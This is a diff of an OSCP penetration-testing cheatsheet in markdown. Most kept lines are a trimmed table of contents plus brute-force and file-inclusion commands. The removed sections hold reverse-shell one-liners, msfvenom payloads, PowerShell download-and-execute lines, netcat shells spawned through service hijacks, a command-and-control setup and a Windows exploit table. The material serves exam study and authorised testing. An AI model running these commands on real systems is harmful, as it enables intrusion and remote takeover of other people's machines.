@@ -10,26 +10,26 @@ description: "OSCP personal cheatsheet"
 - [NMAP](#nmap)
   * [TCP](#tcp)
   * [UDP](#udp)
-  
+
 - [FTP - 21](#ftp---21)
-  
+
   * [Brute force](#brute-force)
   * [Downloading file](#downloading-file)
   * [Uploading file](#uploading-file)
-  
+
 - [SSH - 22](#ssh---22)
   * [Brute force](#brute-force-1)
   * [CVE-2008-0166](#cve-2008-0166)
   * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
-  
+
 - [DNS - 53](#dns---53)
   * [Zone transfert](#zone-transfert)
   * [DNS brute force](#dns-brute-force)
-  
+
 - [FINGER - 79](#finger---79)
   * [User enumeration](#user-enumeration)
   * [Command execution](#command-execution)
-  
+
 - [HTTP - HTTPS - 80 - 443](#http---https---80---443)
   * [Automatic scanners](#automatic-scanners)
   * [Wordpress](#wordpress)
@@ -71,17 +71,17 @@ description: "OSCP personal cheatsheet"
 - [POP3 - 110](#pop3---110)
   * [Brute force](#brute-force-3)
   * [Read mail](#read-mail)
-  
+
 - [SNMP - 161](#snmp---161)
   * [Brute force community string](#brute-force-community-string)
   * [Modifying SNMP values](#modifying-snmp-values)
-  
+
 - [LDAP - 389](#ldap---389)
   * [Scans](#scans)
   * [Graphical Interface](#graphical-interface)
-  
+
 - [SMB - 445](#smb---445)
-  
+
   * [Version if nmap didn't detect it](#version-if-nmap-didnt-detect-it)
   * [Scan for vulnerability](#scan-for-vulnerability)
   * [Manual testing](#manual-testing)
@@ -95,25 +95,25 @@ description: "OSCP personal cheatsheet"
     * [If this doesn't work, try this one](#if-this-doesnt-work-try-this-one)
   * [MS08-067](#ms08-067)
   * [CVE-2017-7494](#cve-2017-7494)
-  
+
 - [MSSQL - 1433](#mssql---1433)
   * [Get information](#get-information)
   * [Brute force](#brute-force-5)
   * [Having credentials](#having-credentials)
   * [Manual exploit](#manual-exploit)
-  
+
 - [NFS - 2049](#nfs---2049)
   * [Show Mountable NFS Shares](#show-mountable-nfs-shares)
   * [Mount a share](#mount-a-share)
   * [NFS misconfigurations](#nfs-misconfigurations)
-  
+
 - [MYSQL - 3306](#mysql---3306)
   * [Brute force](#brute-force-6)
   * [Extracting MySQL credentials from files](#extracting-mysql-credentials-from-files)
   * [Connect](#connect)
   * [MySQL commands](#mysql-commands)
   * [Manual exploit](#manual-exploit-1)
-  
+
 - [RDP - 3389](#rdp---3389)
   * [Brute force](#brute-force)
   * [Connect with known credentials / hash](#connect-with-known-credentials--hash)
@@ -121,7 +121,7 @@ description: "OSCP personal cheatsheet"
     + [Get openned sessions](#get-openned-sessions)
     + [Access to the selected](#access-to-the-selected)
   * [Adding user to RDP group (Windows)](#adding-user-to-rdp-group-windows)
-  
+
 - [VNC - 5800 - 58001 - 5900 - 5901](#vnc---5800---58001---5900---5901)
   * [Scans](#scans-1)
   * [Brute force](#brute-force-8)
@@ -130,43 +130,43 @@ description: "OSCP personal cheatsheet"
     + [Linux](#linux)
     + [Windows](#windows)
   * [Decrypt VNC password](#decrypt-vnc-password)
-  
+
 - [WINRM - 5985 - 5986](#winrm---5985---5986)
   * [Brute force](#brute-force-9)
   * [Connecting](#connecting)
-  
+
 - [CGI](#cgi)
-  
+
   * [Found CGI scripts](#found-cgi-scripts)
-  
+
 - [Command and control framework](#command-and-control-framework)
-  
+
 - [Compiling exploits](#compiling-exploits)
-  
+
   * [For linux](#for-linux)
   * [For windows](#for-windows)
   * [Cross compile](#cross-compile)
-  
+
 - [DICTIONARY GENERATION](#dictionary-generation)
 
 - [FILE TRANSFER](#file-transfer)
   * [Linux](#linux-1)
   * [Windows](#windows-1)
-  
+
 - [GIT](#git)
   * [Download .git](#download-git)
   * [Extract .git content](#extract-git-content)
-  
+
 - [HASHES](#hashes)
   * [Windows](#windows-2)
   * [Linux](#linux-2)
-  
+
 - [MIMIKATZ](#mimikatz)
 
 - [MISCELLANEOUS](#miscellaneous)
-  
+
   * [Get a Windows path without spaces](#get-a-windows-path-without-spaces)
-  
+
 - [MSFVENOM PAYLOAD](#msfvenom-payload)
   * [Linux](#linux-3)
   * [Windows](#windows-3)
@@ -180,7 +180,7 @@ description: "OSCP personal cheatsheet"
   * [Listener](#listener)
     + [Metasploit](#metasploit)
     + [Netcat](#netcat)
-  
+
 - [PASSWORD CRACKING](#password-cracking)
   * [Online](#online)
   * [Hashcat](#hashcat)
@@ -189,12 +189,12 @@ description: "OSCP personal cheatsheet"
     + [Others](#others)
     + [Rules](#rules)
   * [John](#john)
-  
+
 - [PIVOTING](#pivoting)
-  
+
   * [Sshuttle](#sshuttle)
   * [Proxychains](#proxychains)
-  
+
 - [PRIVILE ESCALATION](#privile-escalation)
   * [Linux](#linux-4)
     + [Enumeration scripts](#enumeration-scripts)
@@ -234,13 +234,13 @@ description: "OSCP personal cheatsheet"
       + [Windows 8](#windows-8)
       + [Windows 10](#windows-10)
       + [Windows Server 2003](#windows-server-2003)
-  
+
 - [PROOFS](#proofs)
   * [Linux](#linux-5)
   * [Windows](#windows-5)
-  
+
 - [REVERSE SHELL](#reverse-shell)
-  
+
   - [Amazing tool for shell generation](#amazing-tool-for-shell-generation)
   - [Bash](#bash-1)
   - [Perl](#perl-1)
@@ -249,7 +249,7 @@ description: "OSCP personal cheatsheet"
   - [More reverse shell](#more-reverse-shell)
   - [Interactive shell](#interactive-shell)
   - [Adjust Interactive shell](#adjust-interactive-shell)
-  
+
 - [SHELLSHOCK](#shellshock)
 
 - [USEFUL LINUX COMMANDS](#useful-linux-commands)
@@ -260,7 +260,7 @@ description: "OSCP personal cheatsheet"
   * [Determine more information about the environment](#determine-more-information-about-the-environment)
   * [List processes running](#list-processes-running)
   * [List the allowed (and forbidden) commands for the invoking use](#list-the-allowed-and-forbidden-commands-for-the-invoking-use)
-  
+
 - [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
 
 - [ZIP](#zip)
@@ -285,7 +285,7 @@ autorecon <IP>/CIDR
 
 ## NMAP
 
-### TCP 
+### TCP
 
 ```
 sudo -sS -sC -sV -oA <NAME>.tcp <IP> -v
@@ -508,7 +508,7 @@ tomcat:s3cr3t
 admin:tomcat
 ```
 
-#### Brute force 
+#### Brute force
 
 ```
 hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
@@ -580,7 +580,7 @@ Dictionaries :
 
 #### File backups
 
-Once you have found all the files, look for backups of all the executable files ("*.php*", "*.aspx*"...). Common variations for naming a backup are 
+Once you have found all the files, look for backups of all the executable files ("*.php*", "*.aspx*"...). Common variations for naming a backup are
 
 ```
 file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
@@ -615,7 +615,7 @@ http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO
 
 If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
 
-Code execution with 
+Code execution with
 	- exec
 	- shell_exec
 	- system
@@ -720,7 +720,7 @@ https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
 
 ## POP3 - 110
 
-### Brute force 
+### Brute force
 
 ```
 hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
@@ -1152,13 +1152,13 @@ xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
 query user
 ```
 
-#### Access to the selected 
+#### Access to the selected
 
 ```
 tscon <ID> /dest:<SESSIONNAME>
 ```
 
-### Adding user to RDP group (Windows) 
+### Adding user to RDP group (Windows)
 
 ```
 net localgroup "Remote Desktop Users" <USER> /add
@@ -1170,7 +1170,7 @@ net localgroup "Remote Desktop Users" <USER> /add
 
 ### Scans
 
-``` 
+```
 nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
 ```
 
@@ -1221,59 +1221,6 @@ Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
 /dev/nul
 ```
 
-------
-
-## WINRM - 5985 - 5986
-
-### Brute force
-
-```
-crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
-```
-
-### Connecting
-
-```
-evil-winrm -i <IP> -u <USER> -p <PASSWORD>
-evil-winrm -i <IP> -u <USER> -H <HASH>
-```
-
-------
-
-## CGI
-
-### Found CGI scripts
-
-```
-ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u <URL>/ccgi-bin/FUZZ -t 50
-ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u <URL>/ccgi-bin/FUZZ -t 50
-ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
-```
-
-If a script is found try [SHELLSHOCK](#shellshock).
-
-------
-
-## Command and control framework
-
-```
-# Download
-git clone https://github.com/mhaskar/Octopus/tree/v1.2
-
-# Install requirements
-pip install -r requirements.txt
-
-# Usage
-./octopus.py
-
-# Listener (exemple)
-listen_http <BIND_IP> <BIND_PORT> <HOSTNAME> <INTERVAL_IN_SECONDS> <URL> <LISTENER_NAME>
-listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1
-
-# Agent (exemple)
-generate_powershell <LISTENER_NAME>
-generate_powershell listener_1
-```
 
 ------
 
@@ -1319,72 +1266,10 @@ cewl -m <WORDS_SIZE> --with-numbers -w dictiFromWebsite <URL> -d <DEPTH>
 crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
 ```
 
-------
-
-## FILE TRANSFER
-
-### Linux
-
-```
-# PYTHON
-python -m SimpleHTTPServer <PORT>
-python2.7 -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
-
-# FTP
-sudo python3 -m pyftpdlib  -p 21 -w
-
-# SMB
-sudo smbserver.py -smb2support liodeus .
-
-# WGET
-wget <URL> -o <OUT_FILE>
-
-# CURL
-curl <URL> -o <OUT_FILE>
-
-# NETCAT
-nc -lvp 1234 > <OUT_FILE> 
-nc <IP> 1234 < <IN_FILE> 
-
-# SCP
-scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>
-```
-
-### Windows
-
-```
-# FTP 
-echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
-ftp -v -n -s:ftp.txt
-
-# SMB
-copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
-copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux
-
-# Powershell
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
-powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
-powershell "wget <URL>"
-
-# Python
-python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
-
-# CertUtil
-certutil.exe -urlcache -split -f "<URL>"
-
-# NETCAT
-nc -lvp 1234 > <OUT_FILE> 
-nc <IP> 1234 < <IN_FILE>
-
-# CURL
-curl <URL> -o <OUT_FILE>
-```
-
-------
 
 ## GIT
 
-### Download .git 
+### Download .git
 
 ```
 mkdir <DESTINATION_FOLDER>
@@ -1602,491 +1487,6 @@ proxychains <COMMAND>
 https://artkond.com/2017/03/23/pivoting-guide/
 ```
 
-------
-
-## PRIVILE ESCALATION
-
-### Linux
-
-#### Enumeration scripts
-
-``` 
-bash LinEnum.sh
-bash lse.sh -l 1
-bash linpeas.sh
-python linuxprivchecker.py
-./unix-privesc-check standard
-```
-
-#### Vulnerability scan
-
-```
-perl les2.pl
-bash les.sh
-```
-
-#### Suid checker
-
-```
-python suid3num.py
-
-https://gtfobins.github.io/
-```
-
-#### Methodology to follow
-
-```
-https://guif.re/linuxeop
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
-```
-
-```
-sudo -l
-Kernel Exploits
-OS Exploits
-Password reuse (mysql, .bash_history, 000- default.conf...)
-Known binaries with suid flag and interactive (nmap)
-Custom binaries with suid flag either using other binaries or with command execution
-Writable files owned by root that get executed (cronjobs)
-MySQL as root
-Vulnerable services (chkrootkit, logrotate)
-Writable /etc/passwd
-Readable .bash_history
-SSH private key
-Listening ports on localhost
-/etc/fstab
-/etc/exports
-/var/mail
-Process as other user (root) executing something you have permissions to modify
-SSH public key + Predictable PRNG
-apt update hooking (PreInvoke)
-```
-
-### Windows
-
-#### Enumeration scripts
-
-##### General scans
-
-```
-winPEAS.exe
-windows-privesc-check2.exe
-Seatbelt.exe -group=all
-powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-Powerless.bat
-winPEAS.bat
-```
-
-##### Search for CVE
-
-```
-systeminfo > systeminfo.txt
-python windows-exploit-suggester.py --update
-python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt
-
-systeminfo > systeminfo.txt
-wmic qfe > qfe.txt
-python wes.py -u
-python wes.py systeminfo.txt qfe.txt
-
-powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
-```
-
-##### Post exploitation
-
-```
-lazagne.exe all
-SharpWeb.exe
-mimikatz.exe
-```
-
-#### JuicyPotato (SeImpersonate or SeAssignPrimaryToken)
-
-```
-If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
-
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
-
-# CLSID
-https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
-```
-
-#### Methodology to follow
-
-```
-https://guif.re/windowseop
-https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
-https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
-http://www.fuzzysecurity.com/tutorials/16.html
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
-```
-
-#### Autorun
-
-##### Detection
-
-```
-powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-
-[*] Checking for modifiable registry autoruns and configs...
-
-Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
-Path           : "C:\Program Files\Autorun Program\program.exe"
-ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
-```
-
-or
-
-```
-winPEAS.exe
-
-[+] Autorun Applications(T1010)
-    Folder: C:\Program Files\Autorun Program
-    File: C:\Program Files\Autorun Program\program.exe
-    FilePerms: Everyone [AllAccess]
-```
-
-##### Exploitation
-
-```
-# Attacker
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
-sudo python -m SimpleHTTPServer 80
-sudo nc -lvp <PORT>
-
-# Victim
-cd C:\Program Files\Autorun Program\
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
-
-To execute it with elevated privileges we need to wait for someone in the Admin group to login.
-```
-
-#### AlwaysInstallElevated
-
-##### Detection
-
-```
-powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-
-[*] Checking for AlwaysInstallElevated registry key...
-
-AbuseFunction : Write-UserAddMSI
-```
-
-or
-
-```
-reg query HKLM\Software\Policies\Microsoft\Windows\Installer
-reg query HKCU\Software\Policies\Microsoft\Windows\Installer
-
-If both values are equal to 1 then it's vulnerable.
-```
-
-or
-
-```
-winPEAS.exe
-
-[+] Checking AlwaysInstallElevated(T1012)
-
-  AlwaysInstallElevated set to 1 in HKLM!
-  AlwaysInstallElevated set to 1 in HKCU!
-```
-
-##### Exploitation
-
-```
-# Attacker
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
-sudo python -m SimpleHTTPServer 80
-sudo nc -lvp <PORT>
-
-# Victim
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
-msiexec /quiet /qn /i C:\Temp\program.msi
-```
-
-#### Executable Files
-
-##### Detection
-
-```
-powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-
-[*] Checking service executable and argument permissions...
-
-ServiceName                     : filepermsvc
-Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
-ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
-ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
-ModifiableFileIdentityReference : Everyone
-StartName                       : LocalSystem
-AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
-CanRestart                      : True
-```
-
-or
-
-```
-winPEAS.exe
-
-[+] Interesting Services -non Microsoft-(T1007)
-
-filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
-	File Permissions: Everyone [AllAccess]
-```
-
-##### Exploitation
-
-```
-# Attacker
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
-sudo python -m SimpleHTTPServer 80
-sudo nc -lvp <PORT>
-
-# Victim
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
-copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
-sc start filepermsvc
-```
-
-#### Startup applications
-
-##### Detection
-
-```
-icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-
-C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
-                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
-                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
-                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
-                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
-                                                             Everyone:(I)(OI)(CI)(RX)
-
-If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
-```
-
-##### Exploitation
-
-```
-# Attacker
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
-sudo python -m SimpleHTTPServer 80
-sudo nc -lvp <PORT>
-
-# Victim
-cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
-
-To execute it with elevated privileges we need to wait for someone in the Admin group to login.
-```
-
-#### Weak service permission 
-
-##### Detection
-
-```
-# Find all services authenticated users have modify access onto
-accesschk.exe /accepteula -uwcqv "Authenticated Users" *
-
-if SERVICE_ALL_ACCESS then vulnerable
-
-# Find all weak folder permissions per drive.
-accesschk.exe /accepteula -uwdqs Users c:\
-accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
-
-# Find all weak file permissions per drive.
-accesschk.exe /accepteula -uwqs Users c:\*.*
-accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
-```
-
-or
-
-```
-powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-
-[*] Checking service permissions...
-
-ServiceName   : daclsvc
-Path          : "C:\Program Files\DACL Service\daclservice.exe"
-StartName     : LocalSystem
-AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
-CanRestart    : True
-```
-
-or
-
-```
-winPEAS.exe
-
-[+] Interesting Services -non Microsoft-(T1007)
-
-daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
-	YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
-
-[+] Modifiable Services(T1007)
-	LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
-	daclsvc: WriteData/CreateFiles
-```
-
-##### Exploitation
-
-```
-# Attacker
-sudo python -m SimpleHTTPServer 80
-sudo nc -lvp <PORT>
-
-# Victim
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
-sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
-sc start <SERVICENAME>
-or 
-net start <SERVICENAME>
-```
-
-#### Unquoted service paths
-
-##### Detection
-
-```
-powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-
-[*] Checking for unquoted service paths...
-
-ServiceName    : unquotedsvc
-Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
-ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
-CanRestart     : True
-
-ServiceName    : unquotedsvc
-Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
-ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
-CanRestart     : True
-```
-
-or
-
-```
-winPEAS.exe
-
-[+] Interesting Services -non Microsoft-(T1007)
-
-unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
-```
-
-##### Exploitation
-
-```
-# Attacker
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
-sudo python -m SimpleHTTPServer 80
-sudo nc -lvp <PORT>
-
-# Victim
-cd "C:\Program Files\Unquoted Path Service\"
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
-sc start unquotedsvc
-```
-
-#### Hot potato
-
-##### Exploitation
-
-```
-# Attacker
-sudo python -m SimpleHTTPServer 80
-sudo nc -lvp <PORT>
-
-# Victim
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', '.\Tater.ps1.exe')
-powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
-```
-
-#### CVE
-
-```
-# Already compiled exploit
-https://github.com/SecWiki/windows-kernel-exploits
-https://github.com/abatchy17/WindowsExploits
-```
-
-##### Windows XP
-
-|      CVE      | Description                                                  |
-| :-----------: | :----------------------------------------------------------- |
-| CVE-2002-1214 | ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS |
-| CVE-2003-0352 | ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service |
-| CVE-2003-0533 | MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service |
-| CVE-2003-0719 | ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow |
-| CVE-2003-0812 | ms03_049_netapi - exploits a stack buffer overflow in the NetApi32 |
-| CVE-2003-0818 | ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library |
-| CVE-2003-0822 | ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051 |
-| CVE-2004-0206 | ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service |
-| CVE-2010-3138 | EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse |
-| CVE-2010-3147 | EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse |
-| CVE-2010-3970 | ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution |
-| CVE-2011-1345 | Internet Explorer does not properly handle objects in memory - allows remote execution of code via object |
-| CVE-2011-5046 | EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution |
-| CVE-2012-4349 | Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root |
-
-##### Windows 7
-
-|      CVE      | Description                                                  |
-| :-----------: | :----------------------------------------------------------- |
-| CVE-2010-0232 | ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit |
-| CVE-2010-2568 | ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload |
-| CVE-2010-2744 | EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation |
-| CVE-2010-3227 | EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution |
-| CVE-2014-4113 | ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution |
-| CVE-2014-4114 | ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution |
-| CVE-2015-0016 | ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer's sandbox - code execution |
-| CVE-2018-8494 | remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input |
-
-##### Windows 8
-
-|      CVE      | Description                                                  |
-| :-----------: | ------------------------------------------------------------ |
-| CVE-2013-0008 | ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation |
-| CVE-2013-1300 | ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation |
-| CVE-2013-3660 | ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption |
-| CVE-2013-3918 | ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution |
-| CVE-2013-7331 | ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine's filenames |
-| CVE-2014-6324 | ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation |
-| CVE-2014-6332 | ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability |
-| CVE-2014-6352 | ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution |
-| CVE-2015-0002 | ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation |
-
-##### Windows 10
-
-|      CVE      | Description                                                  |
-| :-----------: | ------------------------------------------------------------ |
-| CVE-2015-0057 | exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine |
-| CVE-2015-1769 | MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege |
-| CVE-2015-2426 | ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver |
-| CVE-2015-2479 | MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege |
-| CVE-2015-2513 | MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution |
-| CVE-2015-2423 | MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure |
-| CVE-2015-2431 | MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution |
-| CVE-2015-2441 | MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution |
-
-##### Windows Server 2003
-
-|      CVE      | Description                                                  |
-| :-----------: | ------------------------------------------------------------ |
-| CVE-2008-4250 | ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX |
-| CVE-2017-8487 | allows an attacker to execute code when a victim opens a specially crafted file - remote code execution |
-
-------
-
-## PROOFS
 
 ### Linux
 
@@ -2100,75 +1500,7 @@ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";e
 echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
 ```
 
-------
 
-## REVERSE SHELL
-
-### Amazing tool for shell generation
-
-```
-# Download
-git clone https://github.com/ShutdownRepo/shellerator
-
-# Install requirements
-pip3 install --user -r requirements.txt
-
-# Executable from anywhere
-sudo cp shellrator.py /bin/shellrator
-```
-
-### Bash
-
-```
-bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
-```
-
-### Perl
-
-```
-perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-
-### Python
-
-```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-
-### Netcat
-
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
-```
-
-### More reverse shell
-
-```
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-```
-
-### Interactive shell
-
-```
-# Python
-python -c 'import pty; pty.spawn("/bin/bash")'
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-# Bash
-echo os.system('/bin/bash')
-
-# Sh
